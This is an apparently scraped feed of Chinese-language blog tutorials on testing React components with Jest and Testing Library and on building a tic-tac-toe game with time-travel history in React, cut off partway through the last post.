toHaveBeenCalledTimes 偵測不到？當時的情境如下： 1234567891011121314useEffect(() =&gt; { getData() .then() .catch((error) =&gt; { setErrorMessage(error.message) })}, [])async function getData() { const all = await user.getAll() const single = await user.getSingle() setUsers(all) setSingle(single)} 這邊在 useEffect 中去執行 user.getAll() 和 user.getSingle()，所以寫了段測試想檢查是否有正確的呼叫這兩個 function： 12345678910111213141516171819202122232425import { render } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { // mock part const response1 = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] const response2 = { name: 'Leanne Graham' } const mockGetAll = jest.fn().mockResolvedValue(response1) const mockGetSingle = jest.fn().mockResolvedValue(response2) mockUser.mockReturnValue({ getAll: mockGetAll, getSingle: mockGetSingle }) render(&lt;Users /&gt;) // assertion expect(mockGetAll).toHaveBeenCalledTimes(1) // 應該被呼叫 1 次 expect(mockGetSingle).toHaveBeenCalledTimes(1) // 應該被呼叫 1 次}) 結果如下： 原因是 await 的特性會讓 mockGetSingle 等到 mockGetAll 執行完以後才會執行，但測試時卻沒有做任何的等待，所以測試的當下 mockGetSingle 確實還沒有被執行，因此才會得到 0。 解決的方法是把 assertion 加上 waitFor： 12await waitFor(() =&gt; expect(mockGetAll).toHaveBeenCalledTimes(1))await waitFor(() =&gt; expect(mockGetSingle).toHaveBeenCalledTimes(1)) 雖然以這個例子來說只需要幫 mockGetSingle 加上就好，但我自己習慣是一律加上，這樣會更保險一點。 Jest 的顯示結果沒有包含敘述？ 加上 --verbose 這個 flag 就可以解決了： 12npm run test --verboseyarn run test --verbose 有些情況下我只用 querySelector 等等相關的 query 來查詢元素，但那個元素又會根據 state 更新時該怎麼處理？這種情況應該真的很少很少，因為再怎麼樣你最後應該都能透過 data-testId 的方式來處理，但我很巧的就剛好碰到連 data-testId 都沒辦法加的窘境（汗，所以特別說明一下這種時候該怎麼處裡。 來舉一個範例： 1234567891011121314151617181920212223import { useEffect, useState } from 'react'export const QueryByClass = () =&gt; { const [isLogin, setIsLogin] = useState&lt;boolean&gt;(false) useEffect(() =&gt; { // 0.5s 後自動登入 setTimeout(() =&gt; { setIsLogin(true) }, 500) }, []) // 顯示登出或登入按鈕 return ( &lt;div&gt; {isLogin ? ( &lt;button className='btn-logout'&gt;Logout&lt;/button&gt; ) : ( &lt;button className='btn-login'&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} 應該不需要特別說明這是在幹嘛的範例，總之這邊想測試的是使用者登入時是否能看到 login 按鈕。 以這個例子來說你當然可以用 findByRole 來處理，但假設你真的走投無路只剩下 querySelector 之類的選擇時，你可以用 waitFor 來處理： 123456789import { render, waitFor } from '@testing-library/react'import { QueryByClass } from './QueryByClass'describe('QueryByClass', () =&gt; { test('if login, should see the logout button', async () =&gt; { render(&lt;QueryByClass /&gt;) await waitFor(() =&gt; expect(document.querySelector('.btn-logout')).toBeInTheDocument()) })}) waitFor 的原理是他會不停的去執行 callback 中的 assertion，直到 assertion 通過為止。預設的等待時間是 1 秒，有需要的話可以傳入 options 來調整。更多詳細資訊請參考 官方文件 所以這邊的流程就是會不停的用 querySelector 檢按鈕是否在 DOM 裡面，如果一秒內有找到就會 PASS，反之則 FAIL。 Uncaught TypeError: window.matchMedia is not a function我工作專案的中有用到 Ant Design，在跑測試的時候就噴了這個 Error： 這是因為在 jest 的環境（node.js）並沒有 window.matchMedia 這種東西，而我們卻在 component 中用到了，所以才會噴出這個錯誤。 解決的方法就是自己定義一個 mock function，可以加上這段： 1234567891011// setupTests.ts// ...略global.matchMedia = global.matchMedia || function () { return { addListener: jest.fn(), removeListener: jest.fn() } } 我這邊是因為很多地方都有用到 Ant Design 元件所以才加在 setupTests.ts 來做 global 處理，如果你只想針對單筆測試添加的話也是 ok 的： 1234567891011121314151617181920// xxx.test.tsxwindow.matchMedia = window.matchMedia || function () { return { addListener: jest.fn(), removeListener: jest.fn() } }// 跟上面是一樣的東西Object.defineProperty(window, 'matchMedia', { writable: true, value: (query: any) =&gt; { return { addListener: jest.fn(), removeListener: jest.fn() } }}) 附註：如果要用 function 的方式來回傳 object，不要把這個 function 變成 jest.fn 系列的 mock function。雖然官方範例是這樣子做，但我自己實際去跑會出問題。 詳細資訊可以參考 官方文件 或這篇 討論。 怎麼模擬 localStorage？其實就跟前一個問題的概念是一樣的，既然 jest 環境裡沒有 window.localStorage 這種東西，那就只好自己幫他定義一個。 這邊先來看個範例： 123456789101112export const Storage = () =&gt; { function onClick() { localStorage.setItem('username', 'PeaNu') } return ( &lt;div&gt; &lt;h2&gt;User: {localStorage.getItem('username') ?? ''}&lt;/h2&gt; &lt;button onClick={onClick}&gt;Save&lt;/button&gt; &lt;/div&gt; )} 假設我現在想 mock localStorage.getItem 的回傳值的話可以這樣做： 123456789101112131415161718192021222324import { render, screen } from '@testing-library/react'import { Storage } from './Storage'// 定義 mockconst mockLocalStorage = { getItem: jest.fn()}// 綁到 window 身上Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { const mockValue = 'PPB' // 設定 mock function 的 implementation mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue) // 渲染元件 render(&lt;Storage /&gt;) // Assertion expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) expect(name).toHaveTextContent(mockValue) })}) 看 code 應該就能理解在做什麼了。另外這邊有幾個可能會犯的錯，來提醒一下： 1. mock function 的回傳值一定要在單一個 test 中設定，不可以設定在外層： 1234567891011121314151617181920212223import { render, screen } from '@testing-library/react'import { Storage } from './Storage'const mockLocalStorage = { // 也不可以在這邊寫成 jest.fn.mockImplementation(...)，沒有用 getItem: jest.fn()}Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })// 不可以在這邊設定，否則永遠會拿到 undefinedconst mockValue = 'PPB'mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue)describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { render(&lt;Storage /&gt;) expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) // 這段會出錯 expect(name).toHaveTextContent(mockValue) })}) 2. 順序一定要對，不然一樣拿不到回傳值： 123456789101112131415161718192021import { render, screen } from '@testing-library/react'import { Storage } from './Storage'const mockLocalStorage = { getItem: jest.fn()}Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })describe('Storage', () =&gt; { test('mock getItem value', async () =&gt; { const mockValue = 'PPB' // 渲染元件 render(&lt;Storage /&gt;) // 不可以在元件渲染後才設定回傳值，這樣就來不及了。 mockLocalStorage.getItem.mockImplementation((key: string) =&gt; mockValue) expect(mockLocalStorage.getItem).toBeCalledWith('username') const name = screen.getByRole('heading', { level: 2 }) expect(name).toHaveTextContent(mockValue) })}) 如果上面的範例有理解，那 setItem 應該也沒什麼困難的了。可以先自己試試看再回來對 code，看有沒有跟你想的一樣： 1234567test('if button click should setItem to storage', () =&gt; { render(&lt;Storage /&gt;) const button = screen.getByRole('button', { name: /save/i }) userEvent.click(button) expect(mockLocalStorage.setItem).toHaveBeenCalled() expect(mockLocalStorage.setItem).toHaveBeenCalledWith('username', 'PeaNu')}) 參考資料 React Testing Tutorial React Testing Library 官方文件 Jest 官方文件 React Testing by pjchender","link":"/2022/12/09/react-testing/"},{"title":"React 之在戰圈圈叉叉，來加上時光機的功能吧！","text":"為了釐清思路，費了一番功夫呀。 簡述繼上一篇 想用 React 做出五子棋嗎？先從圈圈叉叉開始吧 以後，我們成功做出基本的圈圈叉叉了。 這一次我們來試著幫它加上更厲害的功能吧，就是標題提到的時光機～ 這個功能雖然看起來蠻簡單的，但背後還蠻多細節要考慮的，所以這篇的難度相對來說會比原本的更難一些，不過還是先祝你一切順利，加油吧！ 思考新的資料結構為了把每一次的棋盤狀態都保留下來，所以得先改變一開始的資料結構，原本是長這樣： 12345const squares = [ null, null, null, null, null, null, null, null, null,] 要改成這樣： 12345678910111213141516171819history = [ // 第一次 { squares: [ null, null, null, null, null, null, null, null, null, ] }, // 第二次 { squares: [ null, null, null, null, 'X', null, null, null, null, ] }, // ...] 一個「陣列包物件」，「物件裡面又包陣列」的結構。 把狀態轉移到更上層不過在那之前，先讓我們把 &lt;Board /&gt; 的 state 轉移到最上層的 &lt;Game /&gt;，讓它來管理整個遊戲的 state，修改完以後應該要這樣： &lt;Board /&gt; 的部分： 12345678910111213141516171819202122232425262728293031// 接收傳進來的 squares 跟 handleUpdateSquaresfunction Board({ squares, handleUpdateSquares }) { const renderSquare = (i) =&gt; { return ( &lt;Square value={squares[i]} handleUpdateSquares={() =&gt; handleUpdateSquares(i)} /&gt; ); }; return ( &lt;div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} &lt;Game /&gt; 的部分： 123456789101112131415161718192021222324252627282930313233343536373839export default function Game() { // 移來上層的 state 跟其他東西 const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); let status; const winner = calculateWinner(squares); if (!winner &amp;&amp; !squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } const handleUpdateSquares = (i) =&gt; { // 已經有贏家 or 已經點過 if (calculateWinner(squares) || squares[i]) return; // 更新 state const copySquares = squares.slice(); copySquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(copySquares); setXIsNext(!xIsNext); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; // 傳進去給 &lt;Borad /&gt; &lt;Board squares={squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; // staus 也移到最上層 &lt;div&gt;{status}&lt;/div&gt; &lt;ol&gt;{/* TODO */}&lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; );} 做到這邊以後，遊戲要一樣能正常運行，不會壞掉，壞掉的話代表你有地方做錯了，再多檢查幾次吧！ 更新資料結構接著就可以根據最開始設計的資料結構來做調整了，首先來調整 &lt;Game /&gt; 的部分。 這邊要做的事情其實跟第一個版本是一模一樣的，只是因為資料結構變複雜了，所以可能要多想一下才看得懂在幹嘛，建議就多看註解多想幾遍吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152export default function Game() { /* 1. 改變資料結構 */ const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); /* 2. 每次 re-render 時要判斷輸贏的部分 */ let status; // 拿到最後一筆棋盤狀態的 object const latest = history[history.length - 1]; // 根據棋盤的狀態計算輸贏 const winner = calculateWinner(latest.squares); // 根據狀態顯示不同訊息 if (!winner &amp;&amp; !latest.squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } /* 3. event handler 的部分 */ const handleUpdateSquares = (i) =&gt; { // 拿到最後一筆棋盤狀態的 object const latest = history[history.length - 1]; // 已經有贏家 or 已經點過 if (calculateWinner(latest.squares) || latest.squares[i]) return; // 複製原本的棋盤狀態 const newSquares = latest.squares.slice(); // 把改變的地方更新值 newSquares[i] = xIsNext ? \"X\" : \"O\"; // 更新 state setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board // 把最新的棋盤狀態傳進去 squares={latest.squares} // event handler handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ol&gt;{/* TODO */}&lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; );} 做到這邊以後，遊戲一樣能正常運作，同時也把每一步的紀錄留下了： 顯示歷史紀錄既然已經有對應的 state，就可以利用它來把歷史紀錄顯示到畫面上。 先建立一個用來顯示按鈕的 Component： 123456789function ListItem({ step }) { // 記得要對還沒下半步棋之前的訊息做調整 const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button&gt;{content}&lt;/button&gt; &lt;/li&gt; );} 這邊會接收一個 step，表示這是回到第 N 個步驟的按鈕，至於 &lt;Game /&gt; 的部分也要做對應的處理： 123456789101112131415161718192021222324export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; // 遍歷 history 來渲染 N 個按鈕 &lt;ul&gt; {history.map((item, step) =&gt; ( &lt;ListItem key={step} step={step} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} 做到這邊後，結果會像這樣： 實作跳躍功能畫面 OK 以後，就可以來處理點下按鈕後跳躍的功能。 這邊有兩種做法，一種是跳躍後直接拋棄後面的紀錄，一種是跳躍後又走下一步時才拋棄紀錄，聽不太懂的話參考下面的兩張圖： 第一種比較簡單，第二種是官方教學的作法。這邊我覺得先理解第一種要怎麼做以後，再來學第二種會比較好懂一點，所以會先講第一種的作法。 作法一首先來做跳躍的函式： 1234const handleJumTo = (step) =&gt; { const newHistory = history.slice(0, step + 1); setHistory(newHistory);}; 只要根據傳入的 step 去更新 history 就行了，不過要注意一下 slice 的用法。假如我要回到一開始（step=0），那 slice(0, 0) 只會留下空陣列，所以才要 step + 1。 接著把這個函式傳入 &lt;ListItem /&gt;： 123456789101112131415161718192021222324252627282930export default function Game() { // ... const handleJumTo = (step) =&gt; { // slice(0 ,1) =&gt; 留下一個 // slice(0, 2) =&gt; 留下兩個 const newHistory = history.slice(0, step + 1); setHistory(newHistory); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ul&gt; {history.map((item, step) =&gt; ( // 傳進去 &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} 最後在 &lt;ListItem /&gt; 接收： 12345678function ListItem({ step, handleJumTo }) { const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button onClick={() =&gt; handleJumTo(step)}&gt;{content}&lt;/button&gt; &lt;/li&gt; );} 注意因為要傳入參數，所以 onClick 的 handler 得在包一層 function，如果 arrow function 看不太懂的話，寫成這樣應該會好懂一些： 12345678910function ListItem({ step, handleJumTo }) { const content = step === 0 ? `Go to start` : `Go to ${step}`; return ( &lt;li&gt; &lt;button onClick={fuunction () { handleJumTo(step) }}&gt;{content}&lt;/button&gt; &lt;/li&gt; );} 附註：如果你是寫 class component 的話請務必用箭頭函式，不然會有 this 值跑掉的問題。 做到這邊，跳躍功能就完成了。 確實 OK 了，不過有個地方沒做好，就是目前 player 的狀態應該也要跟著改變才對，現在不管回到第幾步都是輪到 X，所以在跳躍時應該順便做對應的處理： 123456const handleJumTo = (step) =&gt; { const newHistory = history.slice(0, step + 1); setHistory(newHistory); // 更新 player 狀態 setXIsNext(step % 2 === 0);}; X 會出現在第「奇數」步，所以當 step 是偶數時要把 XIsNext 設為 true，反之 false。 做到這邊，整個跳躍的功能就完成了。 順道一提，如果你覺得最後一個按鈕有點多餘的話，可以在渲染 &lt;ListItem /&gt; 的時候多做一道處理： 123456&lt;ul&gt; // 先 slice 掉最後一筆再 map {history.slice(0, -1).map((item, step) =&gt; ( &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))}&lt;/ul&gt; 第一種做法就到這邊結束，這邊附上原始碼，有興趣可以參考看看。 作法二接下來要介紹第二種作法。 首先，為了不在跳躍時直接清掉歷史紀錄，我們得先新增一個 state，用來記錄目前處於哪一步： 12345678export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); // 新增目前步數的 state const [stepNumber, setStepNumber] = useState(0); // ...} 這邊會希望根據這個 state 來顯示目前的棋盤，所以得修改幾個地方： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354export default function Game() { const [history, setHistory] = useState([{ squares: Array(9).fill(null) }]); const [xIsNext, setXIsNext] = useState(true); const [stepNumber, setStepNumber] = useState(0); /* 1. 修改 latest 的值 */ // 原本是 const latest = history[history.length - 1]; const latest = history[stepNumber]; const winner = calculateWinner(latest.squares); let status; if (!winner &amp;&amp; !latest.squares.includes(null)) { status = \"draw!\"; } else if (winner) { status = `Winner is ${winner}`; } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } const handleJumTo = (step) =&gt; { /* 2. 點下跳躍按鈕時更新 stepNumber */ setStepNumber(step); setXIsNext(step % 2 === 0); }; const handleUpdateSquares = (i) =&gt; { const latest = history[history.length - 1]; if (calculateWinner(latest.squares) || latest.squares[i]) return; const newSquares = latest.squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); /* 3. 更新下棋後的 stepNumber */ setStepNumber(history.length); }; return ( &lt;div className=\"game\"&gt; &lt;div className=\"game-board\"&gt; &lt;Board squares={latest.squares} handleUpdateSquares={handleUpdateSquares} /&gt; &lt;/div&gt; &lt;div className=\"game-info\"&gt; &lt;div&gt;{status}&lt;/div&gt; &lt;ul&gt; {history.map((item, step) =&gt; ( &lt;ListItem key={step} step={step} handleJumTo={handleJumTo} /&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; );} 做到這邊後，應該就有這樣的效果： 看起來好像完成了？但很抱歉，並沒有，還有一個地方得調整才行。 剛剛只有示範跳躍的流程是否正常運作，並沒有接著繼續下棋。可是如果在跳躍完以後又繼續下棋的話，會怎麼樣呢？ 先提示一下，主要的問題出在下面這段 code。這邊我卡蠻久的，建議大家可以先自己想想看再滑下去看答案。 123456789const handleUpdateSquares = (i) =&gt; { const latest = history[history.length - 1]; if (calculateWinner(latest.squares) || latest.squares[i]) return; const newSquares = latest.squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); setStepNumber(history.length);}; 這邊的問題有兩個： 沒有根據目前在第幾步來清除不要的歷史紀錄，而是一直沿用上一次的歷史紀錄 來自第一個問題，因為沒有清掉紀錄，所以 stepNumber 的值也會是錯的 這樣講可能有點抽象，所以我舉個例子吧。 假設我下了六步棋，接著我跳回第一步，再下第二步棋，那根據上面的 code 會這樣執行： 1234567891011121314151617const handleUpdateSquares = (i) =&gt; { // 先取出上次的最後一筆歷史紀錄（也就是第六步的紀錄） const latest = history[history.length - 1]; // 判斷是不是已經分出勝負 &amp;&amp; 格子是不是被下過了， // 有的話就不再往下執行 if (calculateWinner(latest.squares) || latest.squares[i]) return; // 複製一份上次的棋盤狀態（也就是第六步的紀錄） const newSquares = latest.squares.slice(); // 把要改的地方更新為 O 或 X newSquares[i] = xIsNext ? \"X\" : \"O\"; // copy 原本的 history，並插入剛剛新產生的棋盤狀態（這邊等於是產生第七筆的紀錄） setHistory([...history, { squares: newSquares }]); // 更新 player setXIsNext(!xIsNext); // 把步驟數更新為新的 history 的長度（第七步） setStepNumber(history.length);}; 注意到問題了嗎？我們原本預期的結果應該要是「把第一步以後的歷史紀錄都清掉，並把步驟數設為第二步」，出來的結果卻是歷史紀錄依然遞增成七筆，而且步驟數也遞增為七。 所以這時候就會產生這種很詭異的結果： 簡單來說就是畫面跟 state 不同步的問題。雖然畫面上的棋盤看起來是空的，但在 state 裡面它已經被點過了，所以才會怎麼點都沒用，只有在我點了 state 裡沒被下過的地方才可以（最後的右下角）。 所以來修正一下這個 bug 吧： 123456789101112131415161718const handleUpdateSquares = (i) =&gt; { // 根據目前的步驟數，取出上一次的歷史紀錄 const latest = history[stepNumber]; // 已經有贏家 or 已經點過 if (calculateWinner(latest.squares) || latest.squares[i]) return; // 複製原本的棋盤狀態 const newSquares = latest.squares.slice(); // 把改變的地方更新值 newSquares[i] = xIsNext ? \"X\" : \"O\"; // 根據目前的步驟數，保留真正需要的歷史紀錄 const newHistory = history.slice(0, stepNumber + 1); // 更新 history setHistory([...newHistory, { squares: newSquares }]); // 更新 player setXIsNext(!xIsNext); // 更新改完紀錄以後的步驟數 setStepNumber(newHistory.length);}; 做到這邊，恭喜你真的完成時光旅行的功能了。 這個圈圈叉叉就到這邊結束了，如果以上你都有弄懂的話就太好囉！ 最後一樣附上原始碼，有興趣都歡迎參考看看。","link":"/2022/04/16/react-tic-tac-toe-add-time-machine/"},{"title":"想用 React 做出五子棋嗎？先從圈圈叉叉開始吧","text":"一步一步來吧！ 簡述在做出五子棋以前，可以先從比較簡單的圈圈叉叉開始，所以這一篇是參考 React 官方教學 做的筆記，不然官方的敘述實在看得我頭很痛rrrr。 分析結構第一步先從結構分析開始，假設我們有以下 Component： Game 整個遊戲 Board 棋盤 Square 每個格子 那結構大概就會長這樣： 1234567891011121314151617181920212223242526272829303132function Square() { return ( &lt;button&gt;格子&lt;/button&gt; );}function Board() { return ( &lt;div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;/div&gt; );}export default function Game() { return &lt;Board /&gt;;} 這邊為了可讀性先把 props 都拿掉了，後面會在一步一步解釋。 規劃 state在圈圈叉叉這遊戲裡面會需要： 棋盤的 state 輪到誰下棋的 state 所以會這樣子做： 1234function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true);} 因為是九宮格，所以會用這樣的陣列來存： 12345const squares = [ null, null, null, null, null, null, null, null, null,] 每當我們想改變棋盤的時候，就會像這樣： 123456// 第一輪const squares = [ \"O\", null, null, null, null, null, null, null, null,] 接著： 123456// 第二輪const squares = [ \"O\", null, null, null, \"X\", null, null, null, null,] 渲染出 Square在有了這些基本規劃後，我們先來處理畫面的問題。 首先要把 squares 當作 props 給 &lt;Square /&gt; 用，讓它根據 state 來顯示目前棋盤的樣子。 所以 &lt;Square /&gt; 的部分會寫成這樣： 123456// 接收 propsfunction Square({ value }) { return ( &lt;button className=\"square\"&gt;{value}&lt;/button&gt; );} 而 &lt;Board /&gt; 的部分則是： 123456789101112131415161718192021222324252627282930function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // 拿來渲染 Square 的函式 const renderSquare = (i) =&gt; { return &lt;Square value={squares[i]} /&gt;; }; return ( &lt;div&gt; &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} 這邊寫成 renderSquare 是為了讓 code 比較簡潔，不然原本得這樣寫： 1234567891011121314151617181920return ( &lt;div&gt; &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[0]} /&gt;} {&lt;Square value={squares[1]} /&gt;} {&lt;Square value={squares[2]} /&gt;} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[3]} /&gt;} {&lt;Square value={squares[4]} /&gt;} {&lt;Square value={squares[5]} /&gt;} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[6]} /&gt;} {&lt;Square value={squares[7]} /&gt;} {&lt;Square value={squares[8]} /&gt;} &lt;/div&gt; &lt;/div&gt;); 做到這一步以後，就能確保 &lt;Square /&gt; 會根據 props 來顯示值，可以試著先把 useState 的初始值設為 \"A\"，就會看到這個結果： 這邊沒問題的話就可以進到下個步驟了。 更新棋盤的 State接著，我們希望當 &lt;Square /&gt; 的按鈕 click 時去修改棋盤的 state，讓它顯示 O 或 X，也就是說 state 必須變成這樣： 12345const newSquares = [ null, null, null, null, null, null, null, null, \"O\",] 不過我們都知道子層沒辦法直接去改放在父層的 state，因此這邊一樣要透過 props 來傳入修改 state 的 function 進去。 這邊先在 &lt;Board /&gt; 寫好用來變更 state 的 function： 12345678910111213141516function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // 預期會傳入一個 i 來告知我們要更新哪一筆值 const handleChangeSquaresState = (i) =&gt; { // 複製一份原本的 const newSquares = squares.slice(); // 把要更新的地方賦值 newSquares[i] = \"O\"; // 傳給 setter setSquares(newSquares); }; // ...} 如果你偏好 map 的話也可以這樣寫： 123456789101112131415function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); const handleChangeSquaresState = (i) =&gt; { setSquares( squares.map((item, index) =&gt; { if (i === index) return \"O\"; return item; }) ); }; // ...} 接著就可以把寫好的東西傳給 &lt;Square /&gt; 了： 12345678910111213141516171819202122function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); const handleChangeSquaresState = (i) =&gt; { const newSquares = squares.slice(); newSquares[i] = \"O\"; setSquares(newSquares); }; const renderSquare = (i) =&gt; { return ( &lt;Square value={squares[i]} // 傳進去 handleChangeSquaresState={() =&gt; handleChangeSquaresState(i)} /&gt; ); }; // ...} 這邊是讓我卡比較久的地方，因為有用到「Clousre」的概念，所以這邊多做個解釋。 首先，我們在渲染 &lt;Square /&gt; 時是這樣做的： 1234567891011return ( {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} {renderSquare(6)} {renderSquare(7)} {renderSquare(8)}); 所以經過 renderSquare 處理後就等於： 12345678910111213&lt;Square value={squares[0]} // 傳進去 handleChangeSquaresState={() =&gt; handleChangeSquaresState(0)}/&gt;&lt;Square value={squares[1]} // 傳進去 handleChangeSquaresState={() =&gt; handleChangeSquaresState(1)}/&gt;... 意思說我們在父層就先透過 Closure 把 i 的值給傳入了，因此 &lt;Square /&gt; 才能直接接受這個 props，並當成 Even handler： 1234567891011121314function Square({ value, handleChangeSquaresState }) { return ( &lt;button className=\"square\" // 這邊 onClick 的值就等於： // () =&gt; handleChangeSquaresState(1) // () =&gt; handleChangeSquaresState(2) // 以此類推 onClick={handleChangeSquaresState} &gt; {value} &lt;/button&gt; );} 這就是為什麼就算 &lt;Square /&gt; 不傳任何參數父層也知道要去改陣列的哪一個值。（這個很重要，不懂的話就多想想看） 做到目前這裡，應該會有這樣的結果： 根據 state 顯示 O 或 X接著要處理 O 跟 X 輪流顯示的問題，所以會用到一開始提的另一個 state，xIsNext。 這邊假設由 X 先下棋，所以初始值設為 true： 1const [xIsNext, setXIsNext] = useState(true); 接著調整一下 handleChangeSquaresState，讓他根據目前 xIsNext 來決定資料要長怎樣： 12345678const handleChangeSquaresState = (i) =&gt; { const newSquares = squares.slice(); // 根據 state 做判斷 newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); // 最後別忘了把值更新 setXIsNext(!xIsNext);}; 做到這邊就可以正確顯示 O 或 X 了，不過要注意一個問題，就是重複點擊： 所以這部分得要多做一層處理： 12345678const handleChangeSquaresState = (i) =&gt; { // 已經有值的話就不往下執行 if (squares[i]) return; const newSquares = squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); setXIsNext(!xIsNext);}; 這樣就解決剛剛的 bug 了。 顯示目前的 player接著來加上一段顯示目前 player 的訊息，在 &lt;Board /&gt; 裡面加上這段： 123456789101112131415161718192021222324252627282930function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // 根據 state 顯示不同訊息 const status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; // ... return ( &lt;div&gt; // 加上 DOM 元素 &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} 做到這邊後會長這樣： 判斷輸贏接下來是最後一步，判斷誰輸誰贏。這邊要注意一下判斷的時機點該放在哪裡？ 其實會有兩個地方： 第一個是 state 更新完畢時，畫面要根據 state 顯示贏家 第二個是在改變 state 以前，要先判斷是不是已經有贏家了？ 我們先來做第一個部分，首先先處理好判斷輸贏的 function： 12345678910111213141516171819function calculateWinner(squares) { const lines = [ [0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6] 